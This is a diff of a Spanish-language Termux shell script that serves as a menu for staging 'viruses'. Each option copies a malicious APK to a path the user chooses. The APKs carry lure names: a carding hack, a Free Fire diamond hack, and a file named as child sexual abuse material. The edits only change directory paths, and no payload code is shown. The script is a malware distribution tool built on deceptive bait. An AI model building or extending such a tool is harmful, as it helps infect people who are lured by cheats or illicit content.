@@ -35,17 +35,18 @@ case $virus in
         echo 'Preparando virus seleccionado...'
 sleep 2
 
-cd /data/data/com.termux/files/home/virusmenuholder
+cd /data/data/com.termux/files/home/virusmenuholder/Virus
 
 read -p "que ruta quieres mover el virus:" ruta
 cp 'HACK CARDING.apk' $ruta
 
         ;;                                        
-2)                                                        echo 'Preparando virus seleccionado...'
+2)                                                        
+        echo 'Preparando virus seleccionado...'
 
 sleep 2
 
-cd /data/data/com.termux/files/home/virusmenuholder
+cd /data/data/com.termux/files/home/virusmenuholder/Virus
 
 read -p "que ruta quieres mover el virus:" ruta
 cp 'Hack Diamantes Free Fire.apk' $ruta
@@ -54,7 +55,7 @@ cp 'Hack Diamantes Free Fire.apk' $ruta
         echo 'Preparando virus seleccionado...'
 sleep 2
 
-cd /data/data/com.termux/files/home/virusmenuholder
+cd /data/data/com.termux/files/home/virusmenuholder/Virus
 
 read -p "que ruta quieres mover el virus:" ruta
 
@@ -64,7 +65,7 @@ cp 'Porno infantil.apk' $ruta
         echo 'Preparando virus seleccionado...'
 sleep 2
 
-cd /data/data/com.termux/files/home/virusmenuholder
+cd /data/data/com.termux/files/home/virusmenuholder/Virus
 
 read -p "que ruta quieres mover el virus:" ruta
 
